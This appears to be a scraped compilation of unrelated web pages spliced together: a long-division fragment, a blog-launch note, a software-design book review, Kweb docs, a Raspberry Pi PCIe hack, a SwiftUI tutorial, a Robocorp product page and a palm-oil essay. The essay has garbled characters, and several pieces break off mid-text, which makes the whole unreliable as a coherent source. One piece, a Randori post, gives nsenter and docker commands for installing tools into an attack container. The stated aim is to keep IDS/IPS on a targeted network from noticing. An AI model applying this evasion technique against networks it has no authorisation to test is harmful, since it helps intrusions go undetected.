3 \end{array} Here, notice that since we’ve already established that what remained of $1529$ could be deducted $8$ times, but not $9$ times, it already followed by then that what <em>would</em> remain of $1529$ must be smaller than the <strong>divisor</strong> itself. In fact, this is reflected in our last tableau as well.</p><p>But either way, the division procedure is now coming to its end, yielding $200 + 10 + 8 = 218$ as the quotient, $3$ as the remainder, and the following <strong>representations</strong> of the division as well:</p><ul><li><strong>Algebraic representation</strong>: $1529 = 7 (218) + 3$</li><li><strong>Fractional representation</strong>: $\displaystyle \frac{1529}{7} = 218 + \frac{3}{7}$</li></ul><h4><span id="Long_Division_Shorthands_%E2%80%94_Quotient_Merging_and_Omissions_of_Zeros"></span><a href="#toc">Long Division Shorthands — Quotient Merging and Omissions of Zeros</a><span></span></h4><p>Now, in the above example, there are two interesting peculiarities.

Posted 24. June 2020.
<strong>1 min read.</strong></p></div><div><div><div><p>Yesterday, I published my new website which has been created with <a href="https://gridsome.org/" title="Gridsome" target="_blank" rel="nofollow noopener noreferrer">Gridsome</a>. I had to reformat my blog posts and add tags to each of them. I have 156 posts, so this was not an easy task, to say the least.</p>
<p>Now I'm writing my first blog post using Forestry, and with any luck, it will post to my repository and deploy to my site with no issues. That's if I've set up the formatting correctly and everything else that comes with it.</p>
<p>I now have a newsletter which you can subscribe to using the form at the bottom of this post. Signing up is easy and it will make sure you never miss an update. However, if you're more of an RSS person, then I have that too.</p>
<p>There are a few more things I would like to add to my website such as comments that aren't by Disqus, social card metadata and an auto-generated sitemap. I should probably create a roadmap on my <a href="https://github.com/Michael-Brooks/michaelbrooks.co.uk" title="GitHub repository" target="_blank" rel="nofollow noopener noreferrer">GH repository</a> for you to keep an eye on.</p>
<p>That's pretty much it for this one, and if you like the new update please let me know on my <a href="https://twitter.com/MBrooksUK" target="_blank" rel="nofollow noopener noreferrer">Twitter page</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div><p>This review is largely in response to the article "<a href="https://qntm.org/clean">It's probably time to stop recommending Clean Code</a>", and the ensuing <a href="https://www.reddit.com/r/programming/comments/hhlvqq/its_probably_time_to_stop_recommending_clean_code/">Reddit discussion</a>.  A lot of really interesting points were brought up, but the big question that the author themself wasn't able to answer was: "What should we recommend instead?"</p>
<p>I believe the book we should be recommending is <em>A Philosophy of Software Design</em> by John Ousterhout.  In this post I want to spend a bit of time reviewing it and giving an overview of the contents, and then I want to explain why, in my opinion, it is such a good recommendation.</p>
<h2>An Empirical Philosophy Book</h2>
<p>The elevator pitch of John Ousterhout's book <em>A Philosophy of Software Design</em> is fairly simple: he is a university professor by profession (albeit one with almost two decades of experience in the "real world"), who each year teaches students how to actually design software in a practical, hands-on course where the students are expected to design and modify "a substantial piece of software" in an iterative way, hopefully understanding more about the practice of software design each time around.</p>
<p>The book, then, is a synthesis of the pieces of wisdom that Ousterhout has himself learned from his own experiences, tempered and refined by the practical examples he has been able to draw from his students.  In this way, it has a (somewhat) scientific, research-based approach, where the author's assertions are backed up with examples from student projects that worked (or didn't).</p>
<p>At it's core, though, this is still philosophy - the book doesn't just list the things that worked well, and the things that worked poorly.  Instead, Ousterhout attempts in each chapter to divine broader truths that apply to software design in general.  There are no lists of what to do and what not to do, but instead principles to follow, red flags to be aware of, and warnings against taking anything too far.</p>
<h2>Structure</h2>
<p>The book is split into a series of chapters, each of which generally explores a single principle.  These range from the very high level ("Working Code Isn't Enough", "Modules Should Be Deep") to the more practical questions ("Choosing Names").  The whole book is relatively short (about 180 pages), and many chapters flow together nicely, which means that it's quite easy to go from cover-to-cover, rather than approach the book as a reference manual.  That said, the final pages provide summaries of the design principles and red flags found in the book, making it easy to reference key parts of the book.</p>
<p>Within each chapter, Ousterhout generally starts by stating a problem or motivation that software engineers will face, and then defining a principle to solve this.  The rest of the chapter is then a discussion of the principle, the dangers of alternative approaches, the red flags that indicate that the principle needs to be applied (or in some cases avoided), and some notes about taking ideas too far.</p>
<p>The examples are often based on problems that Ousterhout has given his classes, which means that they generally feel meaty enough to be worth discussing.  An example of a text editor appears in Chapter 6, but is extended in Chapters 7, 8, 9, and 10 in different contexts.  Enough is omitted from most examples to make the point clear, but enough is kept in to give the feeling of real code.</p>
<h2>Ousterhout's Principles</h2>
<p>The overriding theme throughout the book is that good code <em>looks</em> good.  Ousterhout thinks very much in terms of abstraction and interfaces - where "interfaces" refers to the contact points between different units of abstraction, rather than any similarly-named construct in any particular language.  Most of the book is dedicated to figuring out how to spot bad abstractions and rework them into good abstractions.</p>
<p>To a certain extent, this feels at odds with certain common mantras in software engineering circles today, where we encourage enough other to Keep It Simple, Stupid, and worry about premature abstractions.  <em>Philosophy</em> seems to worry less about the dangers of over-abstraction, and more concerned with how to make sure that the chosen abstraction is a good one.</p>
<p>This approach makes for a more positive experience than in many other programming circles - rather than being warned into a very conservative approach, Ousterhout encourages his readers to go out and make abstractions, but to be careful about designing the correct ones.</p>
<p>This isn't to say that the book isn't also cautionary - in the summary pages at the back, the list of red flags gets more page space than the list of principles, and throughout the book these red flags mark out moments when readers are given the go ahead to use these abstraction techniques.  There are also warnings about when a principle might be used too much.</p>
<h2>Everyone's a Critic</h2>
<p>Beyond the mild danger of encouraging excess abstraction, the biggest issue in <em>Philosophy</em> is probably the missing parts - the topic of testing gets a single page in Chapter 19 (Software Trends), and ideas about effective use of a type system to avoid issues are largely ignored.  Ousterhout's principles will still apply in these areas, but it would be nice to see some more specific discussion of these areas.</p>
<h2>The Target Audience</h2>
<p>It can be a bit unclear at times to whom Ousterhout writes.  A lot of the examples clearly relate to his students, and the projects that they come from have a somewhat academic feel - a text editor here, and an HTTP protocol parser there.  The code in the examples is generally object-oriented (Java and occasional C++), although it generally feels like it could be replaced with most imperative/OO languages without much of an effect.</p>
<p>The use of the phrase "software design" might make one think more of broader software architecture, but Ousterhout uses it more to describe the design of individual modules and functions <em>within</em> a program, rather than the broader architecture of the program itself (although he occasionally touches on that).</p>
<p>More functionally-minded people might think they can simply side-step a lot of the discussion here, in the same way that they can when discussing the Gang of Four's design patterns, but the principle "design errors out of existence" (Chapter 10) and its corollary "design special cases out of existence" should ring bells for people in this area who are also aware of the principle of making illegal states unrepresentable.</p>
<p>Ultimately, I think this book aims at a space that is slightly deeper than a lot of existing software literature.  Where books like <em>Design Patterns</em>, Fowler's <em>Refactoring</em>, and the aforementioned <em>Clean Code</em> are aimed at more traditional "enterprise" software development, <em>Philosophy</em> feels more widely applicable, albeit at the cost of being more abstract and difficult to apply.</p>
<p>In general, I think <em>Philosophy</em> is a good read if you are both (a) working with software regularly, and (b) conscious of the inherent maintenance cost in software, and aiming to minimise it.</p>
<h2>A Book to Recommend</h2>
<p>The original question I wanted to answer was what we, as software engineers, should recommend over books like <em>Clean Code</em>.  As I said, my answer to that question is <em>A Philosophy of Software Design</em>.</p>
<p>Software engineering (indeed, engineering in general) is not a science, insofar as there are no (or at least very few) exact answers.  Everything from the database you use to your choice of testing strategy will be dependent on the context of the software you're writing.  This means that the advice that we give to each other will probably be very context-specific.  In general, you probably shouldn't use a NoSQL database, but in a lot of specific contexts you probably should.</p>
<p>This isn't a problem if we don't run into these exceptional cases often, but engineering is all about exceptional cases - if there were no exceptional cases, we wouldn't need to write any new software, because our existing tools would do the job.  This is where books like <em>Philosophy</em> come in - rather than give situational advice, it attempts to define wider principles that the reader will then need to apply to different situations.</p>
<p>Take, for example, my favourite principle: "Modules should be deep" (explored in Chapter 4).  The idea is that an individual unit of abstraction should do a lot of work (i.e. be deep, and contain a lot of complexity), but it should have a relatively simple interface (i.e. be narrow).  Essentially, if you're going to abstract something, make sure your abstraction is deep.</p>
<p>Notice that this principle says nothing about functions, classes, lines, blocks, parameters, or anything specific to a single language or paradigm.  However, when we apply it, for example to the Java code Robert C. Martin talks about in <em>Clean Code</em>, we can derive some of his ideas from this principle.  Assuming a function is our unit of abstraction (for now, at least), the parameters are its interface, therefore we should reduce the number of parameters to the minimum necessary.</p>
<p>However, because our principle is more general, we can actually correct some of the mistakes Martin makes.  Martin talks about removing parameters by adding private fields to the class that the method belongs to.  When we think in terms of interfaces, we notice that this <em>hasn't decreased the interface at all</em> - we've lost a parameter, but we've gained a private field, and in the process made things harder for the consumer of our abstraction.</p>
<h2>Teaching Principles Over Rules</h2>
<p>When I recommend books, I generally hope that the other person will learn something from the book I have suggested.  If I were to recommend <em>Clean Code</em>, I would hope that the reader would learn something about how to write clean Java code, but I suspect they would mainly learn how to write code like Robert C. Martin - or more accurately, like someone copying Robert C. Martin's actions without always understanding why he's taking them.</p>
<p>I do not feel this way about <em>A Philosophy of Software Design</em>.  When I recommend it, I expect that the reader will not just learn something about Java, …</p></div></div></div>

<h2>Motivation<a href="#motivation" title="Permalink to this headline">¶</a></h2>
<p>Modern websites consist of at least two <a href="https://en.wikipedia.org/wiki/Coupling_(computer_programming)">tightly coupled</a> components, one runs in the browser, the other on the server.  These are often written in different programming languages and must communicate with each other over an HTTP connection.</p>
<p>Kweb’s goal is to eliminate this server/browser separation so that your webapp’s architecture is determined by the problem you’re solving, rather than the limitations of today’s tools.</p>
</div>
<div id="how-does-it-work">
<h2>How does it work?<a href="#how-does-it-work" title="Permalink to this headline">¶</a></h2>
<p>Kweb is a self-contained Kotlin library that can be added easily to new or existing projects.  When Kweb receives
a HTTP request it responds with the initial HTML page, and some JavaScript that connects back to the web server via a WebSocket.  The page then waits and listens for instructions from the server, while notifying the server of relevant browser events.</p>
<p>A common concern about this approach is that the user interface might feel sluggish if it is server driven. Kweb solves this problem by <a href="https://docs.kweb.io/en/latest/events.html#immediate-events">preloading</a> instructions to
the browser to be executed immediately on browser events without a server round-trip.</p>
<p>We’ve designed Kweb to be efficient in both the browser and server, and makes effective use of Kotlin’s concurrency features, particularly <a href="https://kotlinlang.org/docs/reference/coroutines-overview.html">coroutines</a>.</p>
</div>
<div id="features">
<h2>Features<a href="#features" title="Permalink to this headline">¶</a></h2>
<ul>
<li>Allows the problem to determine your architecture, not the server/browser divide</li>
<li>End-to-end Kotlin (<a href="https://steve-yegge.blogspot.com/2017/05/why-kotlin-is-better-than-whatever-dumb.html?m=1">Why Kotlin?</a>)</li>

<p>After seeing the work done by <a rel="noreferrer noopener" href="http://mloduchowski.com/en/blog/raspberry-pi-4-b-pci-express/" target="_blank">Thomasz Mloduchowski</a> and <a rel="noreferrer noopener" href="http://labs.domipheus.com/blog/raspberry-pi-4-pci-express-it-actually-works-usb-sata-gpu/" target="_blank">Colin Riley</a> with managing to bridge the Raspberry Pi 4’s PCI-Express bus to a USB 3.0 port, and then seeing <a rel="noreferrer noopener" href="https://hackaday.com/2019/09/05/pcie-multiplier-expands-raspberry-pi-4-possibilities/#comment-6177569" target="_blank">these comments on hack-a-day</a>, I thought I would give it a go too!</p>



<p>So, here’s a PCIe bridge “chip” that simply replaces the VL805 USB 3.0 controller chip on the Pi, giving access to the PCI-Express bus on a USB 3.0 port. <s>However, this does mean losing all USB functionality of the Pi. That could be a bit of a problem if you ever mess up the networking and need to attach a keyboard.</s> Never mind, it seems that the USB-C power connector <a rel="noreferrer noopener" href="https://www.raspberrypi.org/forums/viewtopic.php?f=29&amp;t=246348&amp;p=1678554" target="_blank">can run as a USB host</a>, allowing a keyboard to be connected if 5V power is supplied through the GPIO header instead.</p>



<div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg" alt="" width="848" height="375" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-300x133.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-768x341.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1536x681.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg 1761w" sizes="(max-width: 848px) 100vw, 848px"></a></figure></div>



<p>The bridge “chip” is a 0.8mm thick PCB from OSHPark with copper pads in the same locations as a real VL805 QFN68 IC package, then traces connecting the PCIe pads to the USB pads that connect to the upper USB 3.0 port. RESET, WAKE and a few other signals were also connected to the lower USB 3.0 port.</p>

Where host HSO/TX will connect to device RX and host HSI/RX to device TX. Man, this is really confusing with TX, RX, device, host, passing through USB, which side is which… 😕</figcaption></figure>



<p>There’s also a small hole near the centre, this allows any leftover solder from the large ground pad to have somewhere to go when placing the chip, otherwise the solder could end up squashed out around the edge, shorting out the pads. The PCB is slightly larger than the QFN68 package, as there is a limit on how close the copper can be to the edge. The fabricated PCB should be sanded down to the correct size, so that the cross-section of the copper pads can be seen at the edge of the PCB, just like on a QFN package.</p>

<p>After replacing the VL805 with the bridge chip I tried a few PCIe cards that were laying around, the first was a Realtek RTL8168 based ethernet adapter… it didn’t work. Then I tried an ASMedia ASM1083 PCIe to PCI converter, that didn’t work either. I looked over all solder joints, checked for continuity, shorts, and everything seemed fine. I tried all kinds of things, like removing the capacitors and swapping the + and – of each signal in case they were swapped at the device end, as this is a feature of PCIe called <a rel="noreferrer noopener" href="https://teledynelecroy.com/doc/understanding-lane-reversal-and-polarity" target="_blank">polarity inversion</a> that maybe the controller did not support. The Pi just would not detect them. It seemed to be unable to train the PCIe link as <code>dmesg</code> showed <code>link down</code> instead of <code>link up, 2.5 Gbps x1 (!SSC)</code>. In the end I ordered a USB 3.0 expansion card containing a VL805, the same as the Pi. When it eventually arrived, I plugged it in and it was detected first time! I found a Realtek RTL8111 based ethernet adapter, and that worked too! After installing the driver for the RTL8111 it was able to obtain an IP from the DHCP server and I could ping the interface.</p>

<p>I wonder what it is about the RTL8168 and ASM1083 that makes them incompatible with the Raspberry Pi? Maybe they just don’t like the PCIe signals running through a load of USB connectors and cables.<br><strong>UPDATE 1:</strong> Using an ASM1184e PCIe switch and these two expansion cards are still not detected, so probably not signal issues. The device trees file has been modified to allow more than one PCIe device, as described in Colins blog post. Other cards work in the switch, just not these two.<br><strong>UDPATE 2:</strong> Nevermind, the problem with the ASM1083 was that I hadn’t connected the 5V rail, and is now detected by the Pi. RTL8168 still doesn’t work for some reason.</p>

<p>A quick test using 4 USB 3.0 flash drives plugged into the VL805 expansion card resulted with a total read throughput of 3 Gbps out of a maximum theoretical throughput of 4 Gbps over a 5 Gbps PCIe 2.0 link. The flash drives had their read speeds almost maxed out, probably slowed down slightly from overhead of having to switch between each drive while reading.<br><strong>UPDATE: </strong>Another test with 5 USB flash drives, a USB hub and a USB-to-Ethernet adapter resulted in 3 Gbps again, so this seems like a limitation of the VL805 or CPU. Other RPi4 benchmarks using SSDs through USB 3 also maxed out at 3 Gbps.</p>



<p>The RESET and WAKE traces on the riser board should be cut, otherwise RESET will be connected to GND preventing the card from starting and WAKE will be connected to 5V possibly damaging the device if that pin is not 5V tolerant. The RESET line should then have a 10k pullup connected to the 3.3V supply, or connected to the D- signal of the lower USB 3.0 port of the Pi.</p>



<p>Colin mentioned that Thomasz also had kernel panic problems with his setup, I had a few panics and freezes too, but they seemed to be caused by wiggling the PCIe card a little too much.</p>

      <p><em>
    This article covers beta technology (iOS 14 and Xcode 12) which might subject to change in the future.

<p>After watching <a href="https://developer.apple.com/videos/play/wwdc2020/10041/" target="_blank" rel="nofollow noopener">What's new in SwiftUI</a>, one feature the caught my attention is <code>matchedGeometryEffect</code>. It is a new SwiftUI effect which can interpolate position and size between two views. Let's see what we can do with it.</p>
<figure>

<h2 id="the-basic">The basic <a href="#the-basic">#</a></h2>
<p>SwiftUI already interpolates view's property for us without the need for <code>matchedGeometryEffect</code>. In the following example, we can animate a rectangle size with a tap gesture.</p>
<pre><code><span><span>struct</span> <span>ContentView</span><span>:</span> <span>View</span> <span>{</span></span><br><span>    @<span>State</span> <span>private</span> <span>var</span> isExpanded <span>=</span> <span>false</span></span><br><span>    </span><br><span>    <span>var</span> body<span>:</span> some <span>View</span> <span>{</span>        </span><br><span>        <span>RoundedRectangle</span><span>(</span>cornerRadius<span>:</span> <span>10</span><span>)</span></span><br><span>            <span>.</span><span>foregroundColor</span><span>(</span><span>Color</span><span>.</span>pink<span>)</span></span><br><span>            <span>.</span><span>frame</span><span>(</span>width<span>:</span> isExpanded <span>?</span> <span>100</span><span>:</span> <span>60</span><span>,</span> height<span>:</span> isExpanded <span>?</span> <span>100</span><span>:</span> <span>60</span><span>)</span></span><br><span>            <span>.</span>onTapGesture <span>{</span></span><br><span>            withAnimation <span>{</span></span><br><span>                isExpanded<span>.</span><span>toggle</span><span>(</span><span>)</span></span><br><span>            <span>}</span></span><br><span>        <span>}</span></span><br><span>        </span><br><span>    <span>}</span></span><br><span><span>}</span></span></code></pre>

<p>SwiftUI interpolates a value changes in view when an animation happens. In our previous example, we change <code>frame</code> value based on <code>isExpanded</code> state. This is great most of the time, but there would be a time when just value change is not enough or not possible to serve your layout. Let's say you want to change your layout from <code>HStack</code> to <code>VStack</code>.</p>
<pre><code><span><span>struct</span> <span>ContentView</span><span>:</span> <span>View</span> <span>{</span></span><br><span>    @<span>State</span> <span>private</span> <span>var</span> isExpanded <span>=</span> <span>false</span></span><br><span>    </span><br><span>    <span>var</span> body<span>:</span> some <span>View</span> <span>{</span></span><br><span>        <span>Group</span><span>(</span><span>)</span> <span>{</span></span><br><span>            <span>if</span> isExpanded <span>{</span></span><br><span>                <span>VStack</span> <span>{</span></span><br><span>                    <span>RoundedRectangle</span><span>(</span>cornerRadius<span>:</span> <span>10</span><span>)</span></span><br><span>                        <span>.</span><span>foregroundColor</span><span>(</span><span>Color</span><span>.</span>pink<span>)</span></span><br><span>                        <span>.</span><span>frame</span><span>(</span>width<span>:</span> <span>60</span><span>,</span> height<span>:</span> <span>60</span><span>)</span></span><br><span>                    <span>Text</span><span>(</span><span>"Hello SwiftUI!"</span><span>)</span><span>.</span><span>fontWeight</span><span>(</span><span>.</span>semibold<span>)</span></span><br><span>                <span>}</span></span><br><span>            <span>}</span> <span>else</span> <span>{</span></span><br><span>                <span>HStack</span> <span>{</span></span><br><span>                    <span>Text</span><span>(</span><span>"Hello SwiftUI!"</span><span>)</span><span>.</span><span>fontWeight</span><span>(</span><span>.</span>semibold<span>)</span></span><br><span>                    <span>RoundedRectangle</span><span>(</span>cornerRadius<span>:</span> <span>10</span><span>)</span></span><br><span>                        <span>.</span><span>foregroundColor</span><span>(</span><span>Color</span><span>.</span>pink<span>)</span></span><br><span>                        <span>.</span><span>frame</span><span>(</span>width<span>:</span> <span>60</span><span>,</span> height<span>:</span> <span>60</span><span>)</span></span><br><span>                <span>}</span></span><br><span>            <span>}</span></span><br><span>        <span>}</span><span>.</span>onTapGesture <span>{</span></span><br><span>            withAnimation <span>{</span></span><br><span>                isExpanded<span>.</span><span>toggle</span><span>(</span><span>)</span></span><br><span>            <span>}</span></span><br><span>        <span>}</span></span><br><span>    <span>}</span></span><br><span><span>}</span></span></code></pre>
<p>Because what SwiftUI sees here is just showing and hiding of different views. The best SwiftUI can do is fade in and out between two views.</p>

<p>This kind of inter-view animation is where <code>matchedGeometryEffect</code> comes into play. <code>matchedGeometryEffect</code> can animate position and size between two views. What we need to do is link two views together. Here is how we do it.</p>

<p>&lt;1&gt; First, we need to define a namespace, a new property wrapper.<br>
&lt;2&gt;, &lt;5&gt; We link two rectangle views together by specified the same id to <code>.matchedGeometryEffect(id: "rect", in: namespace)</code>.<br>
&lt;3&gt;, &lt;4&gt; We link two texts together by specified the same id to <code>.matchedGeometryEffect(id: "text", in: namespace)</code>.</p>
<p>With these extra lines of code, our animation can interpolate nicely. It no longer treats our animation as a show and hides of views anymore, but a change of position and size of the same view.</p>

<p>Since it is still in beta, I'm not sure whether this is a limitation or a bug. I will update once we have a final release. If it is my misunderstanding on the API, please let me know on <a href="https://twitter.com/sarunw" target="_blank" rel="nofollow noopener">Twitter</a> (DM is open).</p>

<p>Not like basic size change animation, <code>matchedGeometryEffect</code> can't animate size change properly.</p>

<h3 id="work-only-on-the-same-namespace">Work only on the same namespace <a href="#work-only-on-the-same-namespace">#</a></h3>
<p>Since <code>@Namespace</code> is a required parameter for <code>matchedGeometryEffect</code> and I can't find a way to pass this around, that's mean everything must happen on the same <code>struct</code>. So, we can't extract any views to their own struct.</p>
<p>We can't extract our animated views to <code>VerticalView</code> and <code>HorizontalView</code> because we can't pass <code>@Namespace</code> into those views.</p>

<h2 id="conclusion">Conclusion <a href="#conclusion">#</a></h2>
<p>My first thought is this <code>matchedGeometryEffect</code> is going to help me do all hero transition effects for modal and navigation view, but it turned out it is not that powerful (at least in this beta version). But this is still in beta, so I hope the animation is getting better when it release (at least for size transition). If they can do this right, a transition between modal and navigation shouldn't be that far.</p>

      <p><span>At Randori, one way our automated attack platform operates is by bridging docker containers into remote network environments. The actual operation of this system is outside the scope of this article, but in short, a series of network tunnels within network tunnels provides us with a container whose network traffic fully (and only) emerges into a remote network.</span></p>
<p>This system works well for automated attacks, where the complete attack tooling is pre-installed within the container. However, in some cases our Hacker Operations Center (HOC) operators want to manually assist the automated platform to further an attack. When this occurs it is often the case that the operators need to install additional tools in the container.</p>
<p><span>The simplest method (for Debian-based containers) of running ‘apt’ commands does work, but given the package installation traffic egresses onto the remote network this method increases the risks of IDS/IPS detecting the container. Some corporate networks have monitoring and alerting configured for, as an example, package downloads from Kali repos.</span></p>
<p>Luckily, there’s a relatively easy way to sideload packages into a running docker container without changing the networking state* of the container.</p>
<p>Docker containers rely on a feature in Linux called namespaces. Namespaces are methods of separating processes into different environments, such that certain system functions are compartmentalized. Two important namespaces relevant to our side-loading technique are the mount namespace and the network namespace. The mount, or filesystem, namespace determines which files and folders are visible to the process. For example, two processes in different mount namespaces might have different versions of the <code>/bin</code> directory even though both would access the directory using the same path. The network namespace determines the interfaces and routes among a few other network-related settings. Two processes in different network namespaces could see different interfaces: <code>eth0</code> in the first process could be a different <code>eth0</code> than that in the second process. When the docker daemon creates a new container it usually gets a unique network and mount namespace.</p>
<p>Docker isn’t the only program in Linux to help users utilize namespaces. Another widely available program is nsenter. With nsenter we can set the namespaces in which a program is to run. One feature of nsenter is the ability to specify a subset of namespaces (<code>-m</code> for mount) and to use an existing namespace from another process (<code>-t</code> for target pid). By setting only the mount namespace to be that of a target container, and leaving the network and other namespaces as default, when we run <code>apt-get install</code> the repositories configured in the container are used, and the packages are installed in the container, but all the network traffic emerges on the host, instead of the network configured in the container.</p>
<p><em>* Note: if you have resolv.conf configured in the container to resolve to the target network or use custom dns only available on the target network, you’ll most likely need to replace this temporarily, add hosts entries to prevent use of dns resolvers, or setup your repository sources to use IPs.</em></p>
<p>Here’s what it looks like in a “real-ish” example:</p>
<ol>
<li>Let’s start a container named target with no network access, and provide a basic resolv.conf:
<div>
<pre data-lang="Bash"><code>$ docker run -d --rm --network none --name target ubuntu sleep infinity
$ docker exec -it target bash -c 'echo nameserver 1.1.1.1 &gt; /etc/resolv.conf'</code></pre>
</div>
</li>
<li>We can verify that we are unable to install from within the container:
<div>
<pre data-lang="Bash"><code>$ docker exec -it target apt-get update
... Temporary failure resolving 'security.ubuntu.com' ...</code></pre>
</div>
</li>
<li>However, if we run the command in the host namespaces, except using mount namespace of the container, we can install into the container:
<div>
<pre data-lang="Bash"><code>$ CONTAINER_NAME=target
$ CONTAINER_PID=`docker inspect -f '{{.State.Pid}}' $CONTAINER_NAME`
$ sudo nsenter -m -t $CONTAINER_PID apt-get update
$ sudo nsenter -m -t $CONTAINER_PID apt-get install sl</code></pre>
</div>
</li>
<li>Finally we can verify that the package was installed and remove the container:
<div>
<pre data-lang="Bash"><code>$ docker exec -it target /usr/games/sl
$ docker kill target</code></pre>
</div>
</li>
</ol>
<p>Simple, but effective!</p>
<p>Let us know what other container tips and tricks you use or would want to see more of on Twitter @RandoriAttack. We look forward to sharing more adversarial tips, techniques and POCs here as we continue to enhance the capabilities of our automated attack platform.</p>

<p>To dive deeper into the Robocorp Suite, let's go over the products that you can use to <em>learn</em> all about software robots, <em>build</em> powerful automation with open-source tools, and <em>run</em> your software robots with our cloud platform.</p>
<h2 id="robohub---site-for-learning-software-robot-development"><a href="#robohub---site-for-learning-software-robot-development" aria-label="robohub   site for learning software robot development permalink"></a>Robohub - Site for learning software robot development</h2>
<p><a href="https://hub.robocorp.com/">Robohub</a> is a constantly growing repository of learning materials and documentation for software robot developers. These resources are freely available and can be used by developers to learn about software robots and RPA.</p>
<p>With the help of the courses and tutorials, you can quickly get the gist of the human-readable syntax of Robot Framework. Beginners' course is aimed at those of you starting your software robot developer path. There is also a growing repository of tutorials to support more advanced use.</p>
<p>Robohub also hosts a curated selection of recommended resources for building software robots. You can browse through the selection of open source libraries and a keyword search to help you easily find what you need.</p>
<p><img src="https://robocorp.com/8585841f87b34359a2115dcca751779d/hub.gif"></p>

<p>Robocode empowers developers with all skill levels to start building software robots.</p>
<p><a href="https://robocorp.com/download"><strong>Robocode Lab</strong></a> provides an&nbsp;easy&nbsp;way to get everything needed in one place. With the simple installer (we support Windows, macOS, and Linux) you get an environment designed for software robot development. You can focus on building instead of figuring out packages and configurations. If you want to bring your own editor instead or integrate with CI tools, you can choose to use Robocode CLI.</p>
<p>Open-source <a href="https://rpaframework.org/" title="RPA Framework — RPA Framework documentation"><strong>RPA Framework</strong></a> libraries support the automation of typical use-cases with Robot Framework and Python. You can automate processes just by combining simple keywords like "open browser" and "click element". Our open ecosystem is also extendable with any external Python library and you can find a listing of our favorite Robot Framework libraries at <a href="https://hub.robocorp.com/resources/libraries/" title="Libraries - Resources | Robohub">Robohub</a>.</p>
<p>Robocode, together with RPA Framework, addresses RPA-specific needs, such as handling user credentials, inspecting elements, and maintaining configurations for production and dev environments. Robocode enables interactive editing making tasks like locator handling and cropping template images quick and seamless.</p>

<h2 id="robocloud---platform-for-putting-software-robots-to-work"><a href="#robocloud---platform-for-putting-software-robots-to-work" aria-label="robocloud   platform for putting software robots to work permalink"></a>Robocloud - Platform for putting software robots to work</h2>
<p><a href="https://cloud.robocorp.com/" title="Robocloud">Robocloud</a> allows you to start operating software robots in an instant. It's always available and doesn't require complicated infrastructure setup. We have designed Robocloud to scale from a small proof-of-concept to large enterprise operations. This shows in both the technology architecture and our <a href="https://robocorp.com/pricing">pricing model</a>.</p>
<p>Being cloud-native brings many benefits ranging from ease of use to security. However, we know that software robots need to run often inside local networks. That's why our Robocloud Workers can operate either in self-hosted environments or in our cloud as fully hosted containers.</p>
<p>Security is Robocloud's guiding design principle. In practice, this is shown on many levels of the product. The Vault allows users to store sensitive information, like user credentials, that are used by software robots. Robocloud Workers use bi-directional authentication to verify that the connection between the cloud and the worker is secure. Support for multiple workspaces inside Robocloud enables organizations to control user access to different processes and data.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>A</span>s little as two centuries ago, the northern edge of the island of Borneo, home to Malaysiaâ€™s Sarawak state, was covered in a verdant canopy that stretched, uninterrupted, from shore to shore. It was a forest that had persisted for more than 100 million years, sheltering a dizzying abundance of plants, animals, and fungi that were found nowhere else on Earth. It survived the extinction of the dinosaurs and countless cycles of glaciation. It housed humans for 40,000 years while our species grew and grew around the world. 
  </p>

<p>Then, over the past few decades, the forests of Sarawak faced threats unlike any before. The canopy began to recoil, its edges assaulted by the expansion of hydroelectric power, logging, and, most impactful of all, palm oil plantations. To many people, these changes look like the necessary costs of progress. Development has consumed almost a third of the forest, but it has also lifted millions out of poverty. The first wave of palm oil plantations, from the 1970s to the 1990s, provided farmers with seven times the income of subsistence-food croppers in the same regions. Industry has brought paved roads, better schools, and modern information infrastructure. 
  </p>
<p>The oil palm (formally <em>Elaeis guineensis)</em> is a Shiva of the modern consumer economy, a great creator and a great destroyer. A startling amount of human happiness and wellbeing depends on our relationship with this one plant. Presently palm oil accounts for 60 percent of all cooking oil, more than 62 million tons in total. Itâ€™s found in half of supermarket goods, from instant noodles to ice cream, air fresheners to shampoos. You may not see it but you are eating it and washing your hair with it. Consumer-product manufacturers prefer palm oil because it blends well with other oils and is the ideal elixir to create various consistencies. Savvy food marketers love it because it contains low levels of artery-clogging trans fats. 
  </p>
<p>Youâ€™d have to look far and wide to find a major company that doesnâ€™t have palm oil on its hands. They include Walmart, Colgate-Palmolive, Kelloggâ€™s, Nestle, McDonalds, Ikea, Target, and Whole Foods. Palm oil is mixed into animal feed and <a href="https://www.cshl.edu/podcasts/base-pairs-episode-16-big-plans-for-a-tiny-plant/" target="_blank">biofuels</a>.
  </p>
<blockquote>The oil palm is a Shiva of the modern consumer economy, a great creator and a great destroyer.</blockquote>
<p>Malaysia accounts for 26 percent of the vast production of palm oil today, making it a great creator for the local economy as well. Almost half of oil palms in that country are grown by smallholders rather than large-scale agribusiness. The crop is so important that government insiders consider its development synonymous with the eradication of poverty in Malaysia. Between 1980 and 2010, palm oil cultivation doubled in Malaysia. Then, in just four years, it doubled again. 
  </p>
<p>Therein lies the seemingly intractable dilemma of humanityâ€™s intimate relationship with this tropical tree. Palm oil production is phenomenally important to local peoples and international economies. But it is also tremendously <a href="https://www.iucn.org/resources/issues-briefs/palm-oil-and-biodiversity">destructive to natural ecosystems</a> and to the global climate.</p>
